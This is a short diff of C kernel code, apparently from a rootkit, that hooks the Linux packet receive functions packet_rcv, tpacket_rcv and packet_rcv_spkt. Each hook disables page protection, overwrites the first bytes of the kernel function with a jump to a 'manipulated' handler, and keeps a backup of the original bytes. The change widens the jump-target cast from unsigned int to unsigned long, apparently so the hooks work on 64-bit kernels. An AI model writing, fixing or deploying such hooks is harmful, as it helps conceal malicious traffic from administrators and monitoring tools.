@@ -62,7 +62,7 @@ hook_packet_rcv (void)
 	disable_page_protection();
 
 	/* set the correct jump target */
-	*target = (unsigned int *) manipulated_packet_rcv;
+	*target = (unsigned long *) manipulated_packet_rcv;
 
 	/* backup and overwrite the first part of the function */
 	memcpy(original_packet_rcv, packet_rcv, 10);
@@ -80,7 +80,7 @@ hook_tpacket_rcv (void)
 	disable_page_protection();
 
 	/* set the correct jump target */
-	*target = (unsigned int *) manipulated_tpacket_rcv;
+	*target = (unsigned long *) manipulated_tpacket_rcv;
 
 	/* backup and overwrite the first part of the function */
 	memcpy(original_tpacket_rcv, tpacket_rcv, 10);
@@ -98,7 +98,7 @@ hook_packet_rcv_spkt (void)
 	disable_page_protection();
 
 	/* set the correct jump target */
-	*target = (unsigned int *) manipulated_packet_rcv_spkt;
+	*target = (unsigned long *) manipulated_packet_rcv_spkt;
 
 	/* backup and overwrite the first part of the function */
 	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 10);
